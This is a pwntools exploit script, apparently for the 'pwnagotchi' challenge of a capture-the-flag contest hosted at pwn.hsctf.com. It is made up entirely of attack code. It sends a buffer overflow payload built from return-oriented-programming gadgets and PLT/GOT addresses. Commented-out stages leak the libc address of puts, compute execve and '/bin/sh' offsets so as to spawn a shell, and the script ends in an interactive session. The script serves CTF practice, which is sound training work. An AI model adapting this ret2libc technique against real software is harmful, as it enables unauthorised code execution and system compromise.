from pwn import *
context.update(log_level= 'debug')

p = remote('pwn.hsctf.com', 5005)
#p = process('pwnagotchi')

p.recvrepeat(1)

e = ELF('pwnagotchi')
addr_plt_puts = e.plt['puts']
addr_plt_gets = e.plt['gets']
addr_got_puts = e.got['puts']

addr_pop_rdi = 0x00000000004009f3
addr_pop_rsi = 0x00000000004009f1 # rsi, r15 ret

addr_eat = 0x4007E7
addr_zzz = 0x400801 

addr_bss = 0x0000000000601078
addr_main = 0x40095E
offset_execve = 0x64470
offset_puts = 0x809c0
offset_binsh = 0x7ffff7b97e9a - 0x00007ffff79e4000

addr_pop_rsp = 0x4009ed #rsp, r13,r14,r15 ret


'''
payload = 'a'*20 + p64(addr_pop_rdi) + p64(addr_got_puts) + p64(addr_plt_puts)
payload += p64(addr_pop_rdi) + p64(addr_bss) + p64(addr_plt_gets)
payload += p64(addr_pop_rdi) + p64(addr_got_puts) + p64(addr_plt_gets)
payload += p64(addr_pop_rsi) + p64(0) + p64(0)
payload += p64(addr_pop_rdi) + p64(addr_bss) + p64(addr_plt_puts)
payload += p64(addr_main)

'''
payload = 'a'*20 + p64(addr_pop_rdi) + p64(addr_eat) + p64(addr_zzz) + p64(addr_main)

#raw_input('pid: ' + str(p.pid))

p.sendline(payload)
'''
p.recvuntil('happy!\n')
addr_libc_puts = u64(p.recvuntil('\n').replace('\n', '').ljust(8, '\x00'))
log.info('addr_libc_puts: ' + hex(addr_libc_puts))


addr_libc_execve = addr_libc_puts + offset_execve
log.info('libc_execv: ' + hex(addr_libc_execve))


#stage 2
#p.sendline('/bin/sh;')

#p.sendline(p64(addr_libc_execve))
'''

p.interactive()
